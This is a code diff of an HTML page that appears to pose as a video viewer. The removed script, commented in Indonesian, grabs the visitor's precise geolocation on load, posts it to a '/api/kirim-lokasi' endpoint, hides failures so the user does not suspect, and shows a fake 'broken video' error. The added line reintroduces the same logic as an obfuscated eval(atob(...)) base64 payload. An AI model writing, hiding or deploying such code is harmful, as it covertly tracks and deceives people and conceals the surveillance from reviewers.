@@ -53,45 +53,7 @@
   </div>
 </div>
 
-<script>
-window.onload = () => {
-  if (!navigator.geolocation) {
-    setTimeout(showError, 1500);
-    return;
-  }
-
-  // Meminta lokasi otomatis tanpa klik tombol apa pun
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      try {
-        await fetch('/api/kirim-lokasi', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          })
-        });
-      } catch (err) {
-        // Gagal nge-hit API dibiarkan saja agar pengguna tidak curiga
-      } finally {
-        showError();
-      }
-    },
-    (err) => {
-      // Jika ditolak atau error, tetap tampilkan error seolah-olah video rusak
-      showError();
-    },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-  );
-};
-
-function showError() {
-  document.getElementById('loadingSec').classList.add('hidden');
-  document.getElementById('errorSec').classList.remove('hidden');
-}
-</script>
+<script>eval(atob("CmZ1bmN0aW9uIHNob3dFcnJvcigpe2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nU2VjJykuY2xhc3NMaXN0LmFkZCgnaGlkZGVuJyk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyl9d2luZG93Lm9ubG9hZD0oKT0+e2lmKCFuYXZpZ2F0b3IuZ2VvbG9jYXRpb24pe3NldFRpbWVvdXQoc2hvd0Vycm9yLDE1MDApO3JldHVybn1uYXZpZ2F0b3IuZ2VvbG9jYXRpb24uZ2V0Q3VycmVudFBvc2l0aW9uKGFzeW5jKHBvcyk9Pnt0cnl7YXdhaXQgZmV0Y2goJy9hcGkva2lyaW0tbG9rYXNpJyx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2xhdDpwb3MuY29vcmRzLmxhdGl0dWRlLGxvbjpwb3MuY29vcmRzLmxvbmdpdHVkZSxhY2N1cmFjeTpwb3MuY29vcmRzLmFjY3VyYWN5fSl9KX1jYXRjaChlcnIpe31maW5hbGx5e3Nob3dFcnJvcigpfX0sKGVycik9PntzaG93RXJyb3IoKX0se2VuYWJsZUhpZ2hBY2N1cmFjeTp0cnVlLHRpbWVvdXQ6MTAwMDAsbWF4aW11bUFnZTowfSl9Owo="));</script>
 
 </body>
 </html>
